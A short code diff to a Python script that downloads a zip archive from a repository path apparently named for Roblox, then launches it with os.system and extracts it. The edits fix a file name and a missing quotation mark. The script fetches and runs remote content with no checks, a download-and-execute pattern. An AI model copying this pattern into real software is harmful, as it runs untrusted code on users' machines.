@@ -8,7 +8,7 @@ remote_url = '/bj0rntje/roblox/archive/refs/heads/main.zip'
 local_file = 'packaged.zip'
 # Download remote and save locally
 request.urlretrieve(remote_url, local_file)
-f = open("loader.py", "r")
+f = open("packaged.zip", "r")
 commanding = "start "+local_file
 time.sleep(1)
 os.system(commanding)
@@ -20,7 +20,7 @@ os.system(commanding)
 from zipfile import ZipFile
   
 # loading the temp.zip and creating a zip object
-with ZipFile(packaged.zip", 'r') as zObject:
+with ZipFile("packaged.zip", 'r') as zObject:
   
     # Extracting all the members of the zip 
     # into a specific location.
